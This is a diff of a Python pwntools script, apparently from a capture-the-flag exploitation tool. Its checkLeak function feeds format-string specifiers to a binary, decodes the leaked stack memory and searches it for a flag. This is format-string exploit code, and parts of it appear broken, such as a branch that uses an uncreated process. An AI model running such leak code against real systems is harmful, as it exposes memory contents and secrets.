@@ -1,12 +1,12 @@
-from pwn import *
 import binascii
+import re
 import string
+import typing
+
+from pwn import *
 
 
-def checkLeak(
-    binary_name, properties, remote_server=False, remote_url="", port_num=1337
-):
-
+def checkLeak(binary_name, properties, leak_format) -> bytes:
     full_string = b""
     run_count = 50
 
@@ -19,16 +19,15 @@ def checkLeak(
 
     format_count = base_input_string.count(b"_%" + format_specifier)
 
-    if properties["input_type"] == "STDIN" or properties["input_type"] == "LIBPWNABLE":
-        for i in range(int(run_count / format_count) + 1):
+    for i in range(int(run_count / format_count) + 1):
+        input_string = base_input_string
 
-            # Create local or remote process
-            if remote_server:
-                proc = remote(remote_url, port_num)
-            else:
-                proc = process(binary_name)
-
-            input_string = base_input_string
+        if (
+            properties["input_type"] == "STDIN"
+            or properties["input_type"] == "LIBPWNABLE"
+        ):
+            # Create a local process
+            proc = process(binary_name)
 
             # Swap in values for every _%x
             for j in range(format_count):
@@ -72,28 +71,23 @@ def checkLeak(
                     try:
                         temp_data.append(binascii.unhexlify(x.decode()))
                     except:
-                        # pass
                         print("[+] Bad chunk {}".format(x))
 
                 data_leaks = temp_data
             print(data_leaks)
             full_string += b"".join(data_leaks)
 
-        # Only return printable ASCII
-        print(b"".join([x.to_bytes(1, "little") for x in full_string]))
-        full_string = b"".join(
-            [
-                x.to_bytes(1, "little")
-                if x.to_bytes(1, "little") in string.printable.encode()
-                else b""
-                for x in full_string
-            ]
-        )
-    else:
-        for i in range((run_count / format_count) + 1):
-
-            input_string = base_input_string
-
+            # Only return printable ASCII
+            print(b"".join([x.to_bytes(1, "little") for x in full_string]))
+            full_string = b"".join(
+                [
+                    x.to_bytes(1, "little")
+                    if x.to_bytes(1, "little") in string.printable.encode()
+                    else b""
+                    for x in full_string
+                ]
+            )
+        else:
             # Swap in values for every _%x
             for j in range(format_count):
                 iter_num = (i * format_count) + j
@@ -109,12 +103,10 @@ def checkLeak(
 
             results = proc.recvall(timeout=5)
 
-            """
-            1. Split data by '_'
-            2. Filter by hexdigits
-            3. flip bytes for endianess
-            4. hex to ascii converstion
-            """
+            # 1. Split data by '_'
+            # 2. Filter by hexdigits
+            # 3. flip bytes for endianess
+            # 4. hex to ascii converstion
             data_leaks = results.split(b"_")
             data_leaks = [
                 x[0:8] if all([y in string.hexdigits for y in x]) else b""
@@ -128,19 +120,16 @@ def checkLeak(
 
             full_string += b"".join(data_leaks)
 
-        # Only return printable ASCII
-        full_string = b"".join(
-            [x if x in string.printable else b"" for x in full_string]
-        )
+            # Only return printable ASCII
+            full_string = b"".join(
+                [x if x in string.printable else b"" for x in full_string]
+            )
 
-    leakProperties = {}
-    leakProperties["flag_found"] = False
+        # Dumb check for finding flag
+        if re.match(leak_format, full_string):
+            print("[+] Flag found:")
+            print(f"[+] Returned {full_string}")
 
-    # Dumb check for finding flag
-    if b"{" in full_string and b"}" in full_string:
-        print("[+] Flag found:")
-        leakProperties["flag_found"] = True
+            return input_string
 
-    leakProperties["leak_string"] = full_string
-    print("[+] Returned {}".format(full_string))
-    return leakProperties
+    return None
